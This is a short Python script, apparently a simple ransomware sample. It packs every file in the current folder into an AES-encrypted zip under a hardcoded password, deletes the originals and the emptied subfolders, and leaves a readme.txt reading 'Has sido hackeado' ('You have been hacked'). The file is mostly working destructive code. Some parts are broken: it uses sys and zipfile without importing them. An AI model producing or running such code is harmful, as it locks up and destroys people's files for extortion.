import os
import pyzipper
import psutil
DEBUG=False
PASSWORD=b'PASSWORD'

def getProcessName():
    process = psutil.Process(os.getpid())
    process_name = process.name()
    return process_name

def zip_folderPyzipper(folder_path):
    # parent_folder = os.path.dirname(folder_path)
    parent_folder = folder_path
    # Retrieve the paths of the folder contents.
    contents = os.walk(folder_path)
    zip_file=None
    zip_file_name='files.zip'
    if DEBUG:
        filename=os.path.basename(__file__)
    else:
        filename=getProcessName()
    try:
        # print(f"Nombre de ejecutable {filename}")
        zip_file = pyzipper.AESZipFile(zip_file_name,'w',
        compression=pyzipper.ZIP_DEFLATED,encryption=pyzipper.WZ_AES)
        zip_file.pwd=PASSWORD
        nested_folders=[]
        for root, folders, files in contents:
            # print(root,folders,files)
            if root!='.':
                nested_folders.append(root)
            # Include all subfolders, including empty ones.
            for folder_name in folders:
                absolute_path = os.path.join(root, folder_name)
                relative_path = absolute_path.replace(parent_folder+os.sep,"")
                zip_file.write(absolute_path, relative_path)

            for file_name in files:
                if file_name!=zip_file_name and file_name!=filename:
                    absolute_path = os.path.join(root, file_name)
                    relative_path = absolute_path.replace(parent_folder+os.sep,"")
                    zip_file.write(absolute_path, relative_path)
                    file_full_path=root+'/'+file_name
                    if os.path.exists(file_full_path):
                        # print(f"Eliminando {file_name}")
                        os.remove(file_full_path)
                    else:
                        pass
                        # print(f"No se pudo eliminar {file_name}")
        nested_folders=list(reversed(nested_folders))
        # print(nested_folders)
        for folder_name in nested_folders:
            os.rmdir(folder_name)
        # print ("'%s' created successfully." % output_path)

    except IOError as message:
        print(message)
        sys.exit(1)
    except OSError as message:
        print(message)
        sys.exit(1)
    except zipfile.BadZipfile as message:
        print (message)
        sys.exit(1)
    finally:
        zip_file.close()

def write_readme():
    with open('readme.txt','w') as file:
        file.write('Has sido hackeado')

if DEBUG:
    folder="files"
else:
    folder="."
zip_folderPyzipper(folder)
write_readme()
